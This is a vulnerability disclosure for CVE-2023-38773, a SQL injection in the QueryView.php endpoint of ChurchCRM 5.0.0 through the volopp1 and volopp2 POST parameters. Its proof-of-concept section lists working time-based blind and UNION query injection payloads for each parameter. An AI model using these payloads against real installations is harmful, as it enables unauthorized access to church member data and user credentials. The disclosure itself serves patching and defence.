# CVE-2023-38773 - SQL Injection in /QueryView.php?QueryID=100

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the volopp1 and volopp2 parameters within the /QueryView.php endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the volopp1 parameter or volopp2 parameter at the /QueryView.php?QueryID=100 endpoint (Volunteers - 'who match two specific codes' query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
Parameter: volopp1 (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: volopp1=74) AND (SELECT 3551 FROM (SELECT(SLEEP(5)))MQTT) AND (2739=2739&volopp2=43&Submit=Execute Query

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: volopp1=74) UNION ALL SELECT CONCAT(0x7170707871,0x5146486d78634f564453545747697a57744848437a6979694d6e585165684b41635778534f517842,0x717a766271),NULL-- -&volopp2=43&Submit=Execute Query


Parameter: volopp2 (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: volopp1=74&volopp2=43) AND (SELECT 8639 FROM (SELECT(SLEEP(5)))XpaW) AND (6740=6740&Submit=Execute Query

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: volopp1=74&volopp2=43) UNION ALL SELECT NULL,CONCAT(0x7170707871,0x4762744e5752645a47665667417a717868725045796958746c6949737a7367615557447a6c674177,0x717a766271)-- -&Submit=Execute Query

